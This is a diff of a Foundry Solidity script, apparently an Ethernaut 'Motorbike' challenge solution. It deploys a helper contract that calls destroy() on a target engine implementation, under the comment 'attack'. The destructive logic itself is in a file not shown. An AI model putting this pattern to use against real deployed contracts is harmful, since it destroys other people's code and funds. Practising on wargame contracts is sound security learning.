@@ -2,7 +2,7 @@
 pragma solidity ^0.8.13;
 
 import {Script, console} from "forge-std/Script.sol";
-import  "../src/25.Motorbike.sol";
+import {DestroyHelper, DestroyEngine} from "../src/25.Motorbike.sol";
 
 contract DestroyEngineScript is Script {
     function setUp() public {}
@@ -12,12 +12,13 @@ contract DestroyEngineScript is Script {
 
         vm.startBroadcast(privateKey);
 
-        // address motorbike =0x451CdAf0f145401984c38a5D2Cb73d5b43CeDADF;
-        address engine = 0xa4b22Afe9690bc5AbB90f6D7D9B94F7516B13c19;
+        // address motorbike = 0x41E03156653c4AD3d1CA58E3C305AC97d8E98513;
+        address engine = 0x334F0BABe721cc01aE4C6AcAceC63F404C853Bca;
 
         // attack
-        DestroyEngine destroyEngine = new DestroyEngine();
-        destroyEngine.destroy(engine);
+        DestroyHelper helper = new DestroyHelper(engine);
+
+        helper.destroy();
 
         vm.stopBroadcast();
     }
